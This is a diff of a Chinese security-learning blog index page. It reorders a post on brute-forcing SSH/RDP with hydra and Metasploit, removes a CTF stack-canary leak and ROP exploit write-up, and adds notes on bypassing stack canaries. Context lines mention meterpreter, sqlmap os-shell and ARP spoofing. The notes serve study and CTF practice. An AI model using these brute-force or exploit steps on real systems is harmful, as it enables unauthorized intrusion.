@@ -47,41 +47,6 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 <p>此时msfconsole就会进入停滞状态，一旦检查到有目标服务器运行了上述命令，就会生成meterpreter连接。</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506787.png" alt="img"></p>
 <p>打不通可能是防火墙或者杀毒软件之类的关系</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/3.%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95/">3.弱口令密码破解登录</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.制作字典：</p>
-<p>(1)利用cewl制作：</p>
-<p>cewl -d 2 -m 5 -w word.txt <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.baidu.com/" >www.baidu.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>(d:deepth，爬取层数</p>
-<p>m:….性能，设置越大爬取越快)</p>
-<p>(2)利用工具制作：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.bugku.com/mima/" >http://www.bugku.com/mima/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 输入相应信息即可生成</p>
-<p>(3)利用github上的工具：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts" >https://github.com/TheKingOfDuck/fuzzDicts</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb" >https://github.com/fuzzdb-project/fuzzdb</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>▲生成的字典可能有中文，使用%s/\v[^\x00-\xff]+//g来强制删除中文[^\x00-\xff]即中文的表示，双字节字符</p>
-<p>2.利用字典爆破SSH/RDP:</p>
-<p>(1)先扫描是否开启了ssh端口：</p>
-<p>nmap -sT -T4 ip：快速扫描</p>
-<p>(1)使用hydra:</p>
-<p>参数设置:</p>
-<p>-l(Login)：想要破解的用户，例如root</p>
-<p>-L(FILE)：指定用户名字典</p>
-<p>-p(pass)：指定密码，如果有密码还爆破干啥</p>
-<p>-P(FILE)：指定密码字典</p>
-<p>-s(PORT)：指定爆破端口</p>
-<p>-M(FILE)：指定目标列表文件，如果有多个IP目标需要攻击，可用来指定</p>
-<p>-C(FILE)：</p>
-<p>-f ：使用-M参数后，找到第一登录名和密码即终止</p>
-<p>▲hydra -l root -p root 127.0.0.1 -s 2222 ssh -f：用root密码登录root通过ssh</p>
-<p>▲hydra -l root -P word.txt 127.0.0.1 -s 2222 -f ssh</p>
-<p>▲hydra -l administrator -P word.txt 127.0.0.1 rdp(类似windows下的ssh)</p>
-<p>★可以使用kali自带的密码字典尝试：</p>
-<p>目录在/usr/share/wordlists/metasploit/下，有很多字典密码</p>
-<p>(2)使用msf攻击</p>
-<p>①搜索一下：search login //login等等</p>
-<p>②通过查找到的使用该模块：use auxiliary/scanner/ssh/ssh_login</p>
-<p>③show options看一下需要设置什么信息，设置ip，用户名，密码字典，端口，爆破线程数量等信息，然后直接run即可。</p>
-<p>set RHOST/USERNAME/PASS_FILE/RPORT/THREADS等等</p>
-<p>3.Burp(burpsuite)爆破后台密码：(还没学)</p>
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/4.SQL%E6%B3%A8%E5%85%A5/">4.SQL注入</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、SQL注入：</p>
 <p>1.常用命令：</p>
 <p>2.SQLMAP使用：</p>
@@ -129,6 +94,41 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 
 <p>这样sqlmap就可以上传东西，写入一些类似于web-shell等东西，从而获取权限。</p>
 <p>③那么就进入os-shell了，可以获取到服务器权限</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/3.%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95/">3.弱口令密码破解登录</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.制作字典：</p>
+<p>(1)利用cewl制作：</p>
+<p>cewl -d 2 -m 5 -w word.txt <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.baidu.com/" >www.baidu.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>(d:deepth，爬取层数</p>
+<p>m:….性能，设置越大爬取越快)</p>
+<p>(2)利用工具制作：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.bugku.com/mima/" >http://www.bugku.com/mima/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 输入相应信息即可生成</p>
+<p>(3)利用github上的工具：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts" >https://github.com/TheKingOfDuck/fuzzDicts</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb" >https://github.com/fuzzdb-project/fuzzdb</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>▲生成的字典可能有中文，使用%s/\v[^\x00-\xff]+//g来强制删除中文[^\x00-\xff]即中文的表示，双字节字符</p>
+<p>2.利用字典爆破SSH/RDP:</p>
+<p>(1)先扫描是否开启了ssh端口：</p>
+<p>nmap -sT -T4 ip：快速扫描</p>
+<p>(1)使用hydra:</p>
+<p>参数设置:</p>
+<p>-l(Login)：想要破解的用户，例如root</p>
+<p>-L(FILE)：指定用户名字典</p>
+<p>-p(pass)：指定密码，如果有密码还爆破干啥</p>
+<p>-P(FILE)：指定密码字典</p>
+<p>-s(PORT)：指定爆破端口</p>
+<p>-M(FILE)：指定目标列表文件，如果有多个IP目标需要攻击，可用来指定</p>
+<p>-C(FILE)：</p>
+<p>-f ：使用-M参数后，找到第一登录名和密码即终止</p>
+<p>▲hydra -l root -p root 127.0.0.1 -s 2222 ssh -f：用root密码登录root通过ssh</p>
+<p>▲hydra -l root -P word.txt 127.0.0.1 -s 2222 -f ssh</p>
+<p>▲hydra -l administrator -P word.txt 127.0.0.1 rdp(类似windows下的ssh)</p>
+<p>★可以使用kali自带的密码字典尝试：</p>
+<p>目录在/usr/share/wordlists/metasploit/下，有很多字典密码</p>
+<p>(2)使用msf攻击</p>
+<p>①搜索一下：search login //login等等</p>
+<p>②通过查找到的使用该模块：use auxiliary/scanner/ssh/ssh_login</p>
+<p>③show options看一下需要设置什么信息，设置ip，用户名，密码字典，端口，爆破线程数量等信息，然后直接run即可。</p>
+<p>set RHOST/USERNAME/PASS_FILE/RPORT/THREADS等等</p>
+<p>3.Burp(burpsuite)爆破后台密码：(还没学)</p>
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/6.ARP%E6%AC%BA%E9%AA%97/">arp欺骗</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.首先查看和自己同属一个网段下的ip：</p>
 <p>nbtscan -r 192.168.80.167/24</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503723.png" alt="img"></p>
@@ -389,23 +389,28 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 <p>这个是没有栈劫持的。Aarch64的csu也不怎么用到，因为aarch64的csu赋值不是pop，SP基本不会动，而且大多时候都是SP寻址。</p>
 <p>参考资料：</p>
 <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/199112#h3-23" >https://www.anquanke.com/post/id/199112#h3-23</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/CSAW%20Quals%20CTF%202017-scv/">CSAW Quals CTF 2017-scv</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，开启了NX和Canary。打开IDA发现程序两个漏洞：</p>
-<p>(1)功能1中栈溢出：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">char buf; // [rsp+10h] [rbp-B0h]</span><br><span class="line">--------------------------------------</span><br><span class="line">v25 = read(0, &amp;buf, 0xF8uLL);</span><br></pre></td></tr></table></div></figure>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/Canary%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">Canary绕过总结</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.有循环时，32或者64位程序下都可以逐字节爆破绕过。</p>
+<p>2.可通过printf字符串漏洞来泄露(%p.%p.%p….)。</p>
+<p>3.通过打印栈上数据的打印函数栈溢出连上canary泄露出来。</p>
+<p>4.当程序直接读取flag进入内存时，利用函数__stack_chk_fail，加上足够长度的栈溢出覆盖argv[0]为程序中保存flag的地址。这样当__stack_chk_fail运行时就会打印出argv[0]中地址上对应的内容，也就是flag。有时候需要设置远程环境变量LIBC_FATAL_STDERR_=1，将flag打印在本地。</p>
+<p>5.由pthread出来的线程函数中如果有足够长度的栈溢出，可以直接覆盖canary来源tcbhead_t结构体中的canary和栈中的canary为同一数值，这样检查仍旧通过。</p>
+<p>(64位中为fs:[28h]，32位中为gs:[14h])</p>
+<p>▲查找方法：</p>
+<p>(1)pwndbg&gt;catch syscall 158</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520600.jpeg" alt="img"></p>
+<p>(2)查看rsi寄存器，里面存的内容就是tcbhead_t结构体的首地址。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520328.jpeg" alt="img"></p>
+<p>(3)之后就可以查看canary的值：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520551.jpeg" alt="img"></p>
+<p>但是这个方法好像不怎么顶用了，libc2.23及以下都行，但是libc2.27就会出现无法访问的错误，具体的原因好像是libc升级之后添加了什么东西设置了不可访问：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520546.jpeg" alt="img"></p>
+<p>32位下没有arch_prctl这个系统调用了，需要看canary的生成函数调用了什么系统调用，方法类似，下断点之后查出来。</p>
+<p>★IDA中远程调试也可以查出来，利用程序开头的fs:28，找到地址，然后减去libc基地址就可以得到偏移。但是需要libc一致，偏移才会一致。而且这个偏移并不是在libc数据段上，只是程序初始化时放在后面的，所以不同的程序不同的libc都会导致偏移不一样，需要具体调试。</p>
+<p>▲长度一般为rbp+2000左右，不同的Libc版本都不太一样，需要调试才能知道。原因是通过pthread出来的线程函数栈会被安置到与TLS相差约2000字节的距离处：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520195.png" alt="img">    <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520726.png" alt="img"></p>
+<p>这里可以看到，第一个是main函数栈，第二个是在main函数中通过pthread进程创建并且调用的函数栈，两者相差将近0x700000000这么远，完全不是正常的函数调用相差的栈距离。同时在该函数中rbp指向的始终是0000(全是)，该函数结束后会先跳转到libc中的libpthread来恢复栈。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">▲64位的tcbhead_t结构体：</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">               thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  int gscope_flag;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;//即为canary，fs:28h处</span><br><span class="line">  uintptr_t pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></div></figure>
 
-<p>(2)功能2中输出字符串：puts(&amp;buf);</p>
-<p>注：这里的put和printf不是同一个概念，不是格式化字符串的函数。但是由于put是直接输出我们的输入，而我们的输入被保存在main函数栈上，所以可以输入足够多的数据连上canary，利用put一并打印出来，从而把canary泄露出来。</p>
-<p>2.调试，IDA中观察位置，计算偏移，可以知道偏移为0xB0-0x8=0xA8=168个字符，(canary通常被放在rbp-0x08的位置处，当然也不一定，最好还是调试一下)这样就可以构造第一个payload:payload1 = ”A”*168 + “B”。</p>
-<p>这里再加一个B是因为canary的保护机制，一般情况下canary的最后两位也就是最后一个字符都是\x00，由于是大端序，所以可以防止不小心把canary泄露出来。因为上一个栈内存的最后第一个字符连接的是下一个栈内存的第一个字符，也就是canary中的\x00，而打印函数默认00是字符串的结尾，所以这里如果输入”A”*168，那么打印出来的就只会是168个A，不会将canary带出来。所以我们再加一个B，覆盖掉canary在占内存的第一个字符00，从而能够连接上成为一个完整的字符串打印出来。但又由于是大端序，泄露出来的canary应该最后一个字符是B，对应\x42，这里需要修改成\x00从而获得正确的canary。同理，如果随机化的canary中含有\x00，那么仍然会导致字符串截断，无法得到正确的canary。所以其实如果多执行几次，碰到包含\x00的canary，就会导致程序出错。</p>
-<p>泄露加修改：canary = u64(‘\x00’+io.recv(7))</p>
-<p>3.之后就可以利用canary的值和栈溢出，调用put函数打印其它函数的实际地址。这里程序使用了read函数，并且同时外部调用了read函数，可以通过输入read的.got表的值，使其打印read函数的真实地址。同时需要注意的是，由于是64位程序，传参是从rdi开始，所以栈溢出的第一个返回地址应该给rdi赋值才对，编写payload1。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload1 = &quot;&quot;</span><br><span class="line">payload1 += &quot;A&quot;*168 #padding</span><br><span class="line">payload1 += p64(canary) #在canary应该在的位置上写canary</span><br><span class="line">payload1 += &quot;B&quot;*8 #这一段实际上是rbp的位置</span><br><span class="line">payload1 += p64(pop_rdi)   </span><br><span class="line">#跳转到pop rdi;retn;所在语句(可以通过ROPgadget查询)，来给rdi传入read函数的got表中的地址。</span><br><span class="line">payload1 += p64(read_got) #被pop rdi语句调用，出栈</span><br><span class="line">payload1 += p64(puts_plt)</span><br><span class="line">#retn到put函数的plt表，调用put函数。</span><br><span class="line">payload1 += p64(start)</span><br><span class="line">#调用之后，返回程序最开始，恢复栈帧，再执行一遍程序</span><br></pre></td></tr></table></div></figure>
-
-<p>这样就可以得到read的实际地址，从而通过libc库计算偏移地址得到基地址。</p>
-<p>5.现在有了libc库的基地址，观察main函数退出时的汇编代码：mov   eax, 0可以使用在2.24libc库条件下可以使用onegadget。</p>
-<p>6.直接计算onegadget偏移，然后覆盖main函数的返回地址，getshell。</p>
-<p>参考资料：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 </div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">101</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">44</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">45</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
   var isXML = true;
   var search_path = 'search.json';
